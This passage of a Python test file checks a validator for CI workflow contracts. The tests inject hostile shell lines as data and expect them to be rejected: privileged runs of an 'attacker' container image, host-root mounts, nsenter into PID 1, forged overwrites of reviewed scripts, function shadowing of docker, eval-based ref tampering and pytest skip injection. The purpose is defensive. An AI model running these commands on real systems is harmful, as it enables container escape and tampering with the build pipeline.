        b"          if False:\n"
        b"              sys.stdout.write(load_attestation(stream).runtime_version)\n",
        b"          def decoy():\n"
        b"              sys.stdout.write(load_attestation(stream).runtime_version)\n",
    ),
)
def test_attestation_loader_call_must_be_reachable(replacement: bytes) -> None:
    workflow = _workflow().replace(
        b'          with Path(sys.argv[2]).open("rb") as stream:\n'
        b"              sys.stdout.write(load_attestation(stream).runtime_version)\n",
        replacement,
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="hardened attestation load"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_loader_cannot_execute_unreviewed_python() -> None:
    workflow = _workflow().replace(
        b'          with Path(sys.argv[2]).open("rb") as stream:\n',
        b'          __import__("os").system('
        b'"docker run --privileged attacker/image:latest")\n'
        b'          with Path(sys.argv[2]).open("rb") as stream:\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="reviewed attestation loader",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_other_pre_sentinel_heredocs_cannot_execute_unreviewed_code() -> None:
    workflow = _workflow().replace(
        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
        b"          python3 - <<'PY'\n"
        b"          import os\n"
        b'          os.system("docker run --privileged attacker/image:latest")\n'
        b"          PY\n"
        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="unreviewed executable heredoc",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_loader_must_import_from_the_reviewed_source_root() -> None:
    workflow = _workflow().replace(
        b'python3 - "$CI_ROOT" "$MCP_ATTESTATION" <<\'PY\'',
        b'python3 - "/tmp/forged-root" "$MCP_ATTESTATION" <<\'PY\'',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="reviewed attestation loader source",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_loader_requires_a_fresh_reviewed_tool_content_seal() -> None:
    seal = (
        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv '
        b'"$MOLECULE_CI_REF" -- scripts/mcp_pin_lockstep.py '
        b"scripts/mcp_built_image_e2e.py\n"
    )
    loader_guard = seal + b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n'
    workflow = _workflow().replace(
        loader_guard,
        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
        1,
    )
    assert workflow != _workflow()

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="reviewed attestation loader content seal",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "operation",
    (
        b"docker run --privileged attacker/image:latest",
        b"docker run --volume /:/host attacker/image:latest",
        b"docker run --pid=host attacker/image:latest",
        b"sudo nsenter --target 1 --mount -- id -u",
    ),
)
def test_privileged_or_host_bound_operations_cannot_precede_the_sentinel(
    operation: bytes,
) -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b"          " + operation + b"\n          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="privileged or host-bound operation precedes",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_indirect_docker_privilege_cannot_precede_the_sentinel() -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b'          HOST_FLAG_A="--privi"\n'
        b'          HOST_FLAG_B="leged"\n'
        b'          docker run "$HOST_FLAG_A$HOST_FLAG_B" attacker/image:latest\n'
        b"          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="privileged or host-bound operation precedes",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_dynamic_command_dispatch_cannot_hide_pre_sentinel_privilege() -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b'          CMD_A="dock"\n'
        b'          CMD_B="er"\n'
        b'          HOST_FLAG_A="--privi"\n'
        b'          HOST_FLAG_B="leged"\n'
        b'          "$CMD_A$CMD_B" run "$HOST_FLAG_A$HOST_FLAG_B" '
        b"attacker/image:latest\n"
        b"          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="dynamic command dispatch",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_dynamic_dispatch_cannot_hide_after_a_command_separator() -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b'          CMD="docker"\n'
        b"          :; \"$CMD\" run --privileged attacker/image:latest\n"
        b"          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="dynamic command dispatch",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_cleanup_function_cannot_hide_pre_sentinel_privilege() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          cleanup_t4_build() {\n"
        b"            docker run --privileged attacker/image:latest\n"
        b"          }\n"
        b"          trap cleanup_t4_build EXIT\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="cleanup function contains an unsupported command",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "trap",
    (
        b"trap 'exit 0' EXIT",
        b"builtin trap 'exit 0' EXIT",
    ),
)
def test_exit_trap_cannot_mask_pre_sentinel_failures(trap: bytes) -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b"          " + trap + b"\n          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="unsupported exit trap",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "trap",
    (
        b":; trap 'exit 0' EXIT",
        b":; { trap 'exit 0' EXIT; }",
    ),
)
def test_inline_exit_trap_cannot_mask_a_pre_sentinel_failure(trap: bytes) -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b"          " + trap + b"\n"
        b"          false\n"
        b"          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="unsupported exit trap",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_case_arm_cannot_hide_an_exit_trap() -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b"          case 1 in\n"
        b"            1) trap 'exit 0' EXIT ;;\n"
        b"          esac\n"
        b"          false\n"
        b"          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="unsupported case control"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_background_work_cannot_race_reviewed_content_seals() -> None:
    workflow = _workflow().replace(
        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
        b'          sh -c \'sleep 1; cp "$1" "$2"\' sh ./forged.py '
        b'"$CI_ROOT/scripts/mcp_pin_lockstep.py" &\n'
        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="background work before the verifier sentinel",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_path_binding_must_be_static_and_run_scoped() -> None:
    workflow = _workflow().replace(
        b'          MCP_ATTESTATION="$RUNNER_TEMP/mcp-attestation-'
        b'${GITHUB_RUN_ID:-local}-${GITHUB_RUN_ATTEMPT:-1}.json"\n',
        b'          MCP_ATTESTATION="$(mktemp)"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="dynamic or unsafe MCP_ATTESTATION binding",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_verifier_container_name_must_be_run_scoped() -> None:
    workflow = _workflow().replace(
        b'          MCP_VERIFY_CONTAINER="mcp-verify-'
        b'${GITHUB_RUN_ID:-local}-${GITHUB_RUN_ATTEMPT:-1}"\n',
        b'          MCP_VERIFY_CONTAINER="shared-victim"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="verifier container name is not run-scoped",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "mount",
    (
        b"--volume /tmp/verifier:/mcp_built_image_e2e.py:ro",
        b"-v /tmp/verifier:/mcp_built_image_e2e.py:ro",
        b"--mount type=bind,source=/tmp/verifier,target=/mcp_built_image_e2e.py",
    ),
)
def test_final_image_verifier_rejects_every_bind_mount_form(mount: bytes) -> None:
    workflow = _workflow().replace(
        b"            --network none --user 1000:1000 --workdir /tmp \\\n",
        b"            --network none " + mount + b" \\\n"
        b"            --user 1000:1000 --workdir /tmp \\\n",
        1,
    )

    with pytest.raises(contract.OfficialConsumerContractError, match="bind mount"):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "override",
    (
        b"--network host",
        b"--user 0:0",
        b"--cap-add ALL",
        b"--privileged",
        b"--security-opt seccomp=unconfined",
        b"--entrypoint /bin/sh",
        b"--env PYTHONPATH=/host",
        b"--volumes-from privileged-container",
    ),
)
def test_final_image_verifier_rejects_unsafe_or_ambiguous_overrides(
    override: bytes,
) -> None:
    workflow = _workflow().replace(
        b"            /mcp_built_image_e2e.py\n",
        b"            " + override + b" \\\n            /mcp_built_image_e2e.py\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="unsafe or ambiguous|bind mount",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_t4_tag_cannot_be_reassigned_between_build_and_verifier() -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b'          T4_TAG="different:image"\n          docker create --interactive',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="same final image"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_final_image_build_rejects_a_second_tag_override() -> None:
    workflow = _workflow().replace(
        b'            -t "$T4_TAG" .\n',
        b'            -t "$T4_TAG" --tag different:image .\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="same final image"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_final_image_build_rejects_an_alternate_dockerfile() -> None:
    workflow = _workflow().replace(
        b'            -t "$T4_TAG" .\n',
        b'            -t "$T4_TAG" --file /tmp/forged.Dockerfile .\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="unsafe or ambiguous"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "replacement",
    (
        b'docker tag forged:image "$T4_TAG"',
        b'docker build -t "$T4_TAG" /tmp/forged-context',
    ),
)
def test_final_image_tag_cannot_be_replaced_after_the_reviewed_build(
    replacement: bytes,
) -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b"          " + replacement + b"\n          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="same final image"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_shell_word_concatenation_cannot_hide_final_image_replacement() -> None:
    workflow = _workflow().replace(
        b"          docker create --interactive",
        b"          d''ocker tag forged:image \"$T4_TAG\"\n"
        b"          docker create --interactive",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="quoted or escaped command name|same final image",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_verifier_copy_cannot_chain_an_unreviewed_overwrite() -> None:
    workflow = _workflow().replace(
        b'            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"\n',
        b'            "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"; '
        b'docker cp /tmp/forged.py "$MCP_VERIFY_CONTAINER:/mcp_built_image_e2e.py"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="invalid verifier copy"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_proof_cannot_shadow_required_executables_with_shell_functions() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          docker() {\n"
        b"            command true\n"
        b"          }\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="shadows a required executable"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize("executable", (b"docker", b"grep"))
def test_proof_cannot_shadow_required_executables_with_alternate_function_syntax(
    executable: bytes,
) -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          function " + executable + b" { command true; }\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="shadows a required executable"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_command_group_cannot_hide_an_inline_function_declaration() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          :; { function docker { command true; }; }\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="shadows a required executable"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize("control", (b"if", b"while"))
def test_shell_control_cannot_hide_an_inline_function_declaration(
    control: bytes,
) -> None:
    closing = b"then\n            :\n          fi" if control == b"if" else (
        b"do\n            break\n          done"
    )
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          "
        + control
        + b" function docker { command true; }\n          "
        + closing
        + b"\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="shadows a required executable"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize("prefix", (b"!", b"time", b"time -p"))
def test_shell_reserved_prefix_cannot_hide_an_inline_function_declaration(
    prefix: bytes,
) -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          "
        + prefix
        + b" function docker { command true; }\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="shadows a required executable"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_case_arm_cannot_hide_required_command_functions() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          case 1 in\n"
        b"            1) function docker { command true; }; "
        b"function grep { command true; } ;;\n"
        b"          esac\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="unsupported case control"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_quoted_function_name_cannot_hide_required_command_shadow() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          function d''ocker { command true; }\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="shadows a required executable"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_lockstep_checker_must_come_from_the_reviewed_fetch() -> None:
    workflow = _workflow().replace(
        b'python3 "$CI_ROOT/scripts/mcp_pin_lockstep.py"',
        b"python3 ./scripts/mcp_pin_lockstep.py",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="unreviewed lockstep checker"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_lockstep_checker_requires_an_adjacent_git_content_seal() -> None:
    seal = (
        b'          git -C "$CI_ROOT" diff --quiet --no-ext-diff --no-textconv '
        b'"$MOLECULE_CI_REF" -- '
        b"scripts/mcp_pin_lockstep.py scripts/mcp_built_image_e2e.py\n"
    )
    workflow = _workflow().replace(seal, b"", 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="reviewed tool content seal"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    ("needle", "replacement"),
    (
        (
            b'          python3 "$CI_ROOT/scripts/mcp_pin_lockstep.py"',
            b'          cp ./forged.py "$CI_ROOT/scripts/mcp_pin_lockstep.py"\n'
            b'          python3 "$CI_ROOT/scripts/mcp_pin_lockstep.py"',
        ),
        (
            b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py"',
            b'          cp ./forged.py "$CI_ROOT/scripts/mcp_built_image_e2e.py"\n'
            b'          docker cp "$CI_ROOT/scripts/mcp_built_image_e2e.py"',
        ),
    ),
)
def test_reviewed_checker_and_verifier_cannot_be_overwritten_before_use(
    needle: bytes, replacement: bytes
) -> None:
    workflow = _workflow().replace(needle, replacement, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="reviewed tool content seal"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_requires_a_content_seal() -> None:
    workflow = _workflow().replace(
        b'          sha256sum "$MCP_ATTESTATION" > "$MCP_ATTESTATION_SHA256"\n',
        b"",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="attestation content seal"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_seal_is_checked_again_immediately_before_start() -> None:
    check = b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n'
    prefix, separator, suffix = _workflow().partition(check)
    assert separator
    workflow = prefix + separator + suffix.replace(check, b"", 1)

    with pytest.raises(
        contract.OfficialConsumerContractError, match="attestation content seal"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_cannot_be_rewritten_after_its_content_seal() -> None:
    workflow = _workflow().replace(
        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
        b'          printf forged > "$MCP_ATTESTATION"\n'
        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="attestation.*rewritten"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_and_sidecar_cannot_be_resealed_with_forged_bytes() -> None:
    workflow = _workflow().replace(
        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
        b'          printf forged > "$MCP_ATTESTATION"\n'
        b'          sha256sum "$MCP_ATTESTATION" > "$MCP_ATTESTATION_SHA256"\n'
        b'          sha256sum --check "$MCP_ATTESTATION_SHA256"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="attestation.*rewritten"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_seal_supports_a_split_command_substitution_loader() -> None:
    workflow = _workflow().replace(
        b'          EXPECTED_RUNTIME_VERSION="$(python3 - "$CI_ROOT" '
        b"\"$MCP_ATTESTATION\" <<'PY'\n",
        b'          EXPECTED_RUNTIME_VERSION="$(\n'
        b'            python3 - "$CI_ROOT" "$MCP_ATTESTATION" <<\'PY\'\n',
        1,
    )
    assert workflow != _workflow()

    contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_attestation_path_cannot_drift_between_generation_and_start() -> None:
    workflow = _workflow().replace(
        b"          docker start --attach",
        b'          MCP_ATTESTATION="/tmp/forged.json"\n'
        b"          docker start --attach",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="different attestation|ambiguous MCP_ATTESTATION",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_verifier_source_root_cannot_drift_after_the_reviewed_fetch() -> None:
    workflow = _workflow().replace(
        b"          docker cp ",
        b'          CI_ROOT="/tmp/unreviewed"\n          docker cp ',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="unreviewed verifier|ambiguous CI_ROOT",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_verifier_must_run_the_same_final_image_that_was_built() -> None:
    workflow = _workflow().replace(
        b'            --tmpfs /tmp:size=64m --entrypoint python3 "$T4_TAG" \\\n',
        b'            --tmpfs /tmp:size=64m --entrypoint python3 "$OTHER_TAG" \\\n'
        b'          # --entrypoint python3 "$T4_TAG"\n',
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="same final image"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "mutation",
    (
        "MOLECULE_CI_REF[0]=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        'names=(MOLECULE_CI_REF); printf -v "${names[0]}" %s bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb',
        "declare -n target=MOLECULE_CI_''REF; target=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        "name=MOLECULE_CI_''REF; eval \"$name=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\"",
    ),
)
def test_shell_cannot_mutate_the_immutable_ref_directly_or_indirectly(
    mutation: str,
) -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n          " + mutation.encode() + b"\n",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError, match="mutate MOLECULE_CI_REF"
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_ref_mutation_text_in_comments_is_inert() -> None:
    workflow = _workflow().replace(
        b"          set -euo pipefail\n",
        b"          set -euo pipefail\n"
        b"          # MOLECULE_CI_REF[0]=comment-only\n"
        b"          # eval 'MOLECULE_CI_REF=comment-only'\n",
        1,
    )

    contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "collection_bypass",
    (
        "import pytest as p\nmarker = p.mark.skip\nglobals()['pytestmark'] = marker\n",
        "def disable_test(fn):\n    return __import__('pytest').mark.skip(fn)\n"
        "globals()['test_t4_runs_immutable_offline_mcp_verifier_against_same_final_image'] = "
        "disable_test(test_t4_runs_immutable_offline_mcp_verifier_against_same_final_image)\n",
    ),
)
def test_pytest_collection_bypass_cannot_mask_a_semantically_invalid_workflow(
    collection_bypass: str,
) -> None:
    workflow = _workflow().replace(b"on: [push, pull_request]", b"on: [push]", 1)
    test_contract = _test_contract("codex") + collection_bypass.encode()

    with pytest.raises(
        contract.OfficialConsumerContractError, match="push and pull_request"
    ):
        contract.validate_contract("codex", workflow, test_contract)


def test_workflow_must_pin_the_exact_immutable_verifier_ref() -> None:
    wrong_ref = "a" * 40

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="dynamic or divergent MOLECULE_CI_REF assignment",
    ):
        contract.validate_contract(
            "codex", _workflow(verifier_ref=wrong_ref), _test_contract("codex")
        )


def test_matching_workflow_ref_assignments_across_scopes_are_accepted() -> None:
    contract.validate_contract(
        "codex",
        _with_workflow_env(_workflow()),
        _test_contract("codex"),
    )


@pytest.mark.parametrize("replacement", ("a" * 40, "${{ github.sha }}"))
def test_divergent_or_dynamic_scoped_workflow_ref_fails_closed(
    replacement: str,
) -> None:
    workflow = _with_workflow_env(
        _workflow(verifier_ref=replacement),
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="dynamic or divergent MOLECULE_CI_REF assignment",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_duplicate_workflow_ref_in_one_env_scope_fails_closed() -> None:
    assignment = f"      MOLECULE_CI_REF: {VERIFIER_REF}\n".encode()
    workflow = _workflow().replace(assignment, assignment * 2, 1)

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="duplicate YAML mapping key",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_shell_reassignment_of_workflow_ref_fails_closed() -> None:
    wrong_ref = "b" * 40
    workflow = _workflow().replace(
        b"          GIT_ASKPASS=/bin/false",
        (
            f"          MOLECULE_CI_REF={wrong_ref}\n          GIT_ASKPASS=/bin/false"
        ).encode(),
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="mutate MOLECULE_CI_REF",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


@pytest.mark.parametrize(
    "missing",
    (
        "GIT_ASKPASS=/bin/false",
        "credential.helper=",
        "--network none",
        "--security-opt no-new-privileges",
        "mcp-built-image-e2e:sentinel:executed",
        "KEEP_T4_IMAGE=1",
    ),
)
def test_missing_workflow_safety_contract_fails_closed(missing: str) -> None:
    workflow = _workflow().replace(missing.encode(), b"removed", 1)

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="ordered executable proof|unsafe or ambiguous|exact-ref fetch",
    ):
        contract.validate_contract("codex", workflow, _test_contract("codex"))


def test_test_module_must_pin_the_same_immutable_verifier_ref() -> None:
    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="test contract does not pin the reviewed molecule-ci verifier",
    ):
        contract.validate_contract(
            "openclaw",
            _workflow(),
            _test_contract("openclaw", verifier_ref="b" * 40),
        )


def test_required_regression_test_function_must_exist() -> None:
    test_contract = _test_contract("claude-code").replace(
        b"test_t4_runs_immutable_offline_mcp_verifier_against_same_final_image",
        b"test_unrelated",
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="required regression test",
    ):
        contract.validate_contract("claude-code", _workflow(), test_contract)


def test_required_regression_test_must_be_synchronous() -> None:
    test_contract = _test_contract("codex").replace(
        b"def test_t4_runs_immutable_offline_mcp_verifier_against_same_final_image():",
        b"async def test_t4_runs_immutable_offline_mcp_verifier_against_same_final_image():",
        1,
    )

    with pytest.raises(
        contract.OfficialConsumerContractError,
        match="plain synchronous function",
    ):
        contract.validate_contract("codex", _workflow(), test_contract)


def test_unknown_consumer_fails_closed() -> None:
    with pytest.raises(
        contract.OfficialConsumerContractError, match="unsupported official consumer"
    ):
        contract.validate_contract("unknown", _workflow(), _test_contract("codex"))


@pytest.mark.parametrize(
    ("workflow", "test_source", "message"),
    (
        (b"x" * (512 * 1024 + 1), _test_contract("codex"), "exceeds the size limit"),
        (_workflow(), b"\xffcredential=must-not-log", "is not UTF-8"),
    ),
)
def test_contract_inputs_are_bounded_without_echoing_contents(
    workflow: bytes, test_source: bytes, message: str
) -> None:
    with pytest.raises(contract.OfficialConsumerContractError, match=message) as error:
        contract.validate_contract("codex", workflow, test_source)

    assert "credential=must-not-log" not in str(error.value)


def test_cli_validates_only_the_two_static_contract_files(tmp_path: Path) -> None:
    repo = tmp_path / "consumer"
    workflow = repo / ".gitea" / "workflows" / "ci.yml"
    tests = repo / "tests"
    workflow.parent.mkdir(parents=True)
    tests.mkdir()
    workflow.write_bytes(_workflow())
    tests.joinpath("test_ci_runtime_image_pin.py").write_bytes(_test_contract("codex"))

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--consumer",
            "codex",
            "--repo-root",
            str(repo),
        ],
        check=False,
        capture_output=True,
        text=True,
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout == "official-consumer-contract:sentinel:executed codex\n"
    assert result.stderr == ""


def test_cli_rejects_a_symlinked_contract_blob(tmp_path: Path) -> None:
    repo = tmp_path / "consumer"
    workflow = repo / ".gitea" / "workflows" / "ci.yml"
    tests = repo / "tests"
    workflow.parent.mkdir(parents=True)
    tests.mkdir()
    outside = tmp_path / "outside.yml"
    outside.write_bytes(_workflow())
    workflow.symlink_to(outside)
    tests.joinpath("test_ci_runtime_image_pin.py").write_bytes(_test_contract("codex"))

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--consumer",
            "codex",
            "--repo-root",
            str(repo),
        ],
        check=False,
        capture_output=True,
        text=True,
    )

    assert result.returncode == 1
    assert "required contract file is not regular" in result.stderr
    assert result.stdout == ""
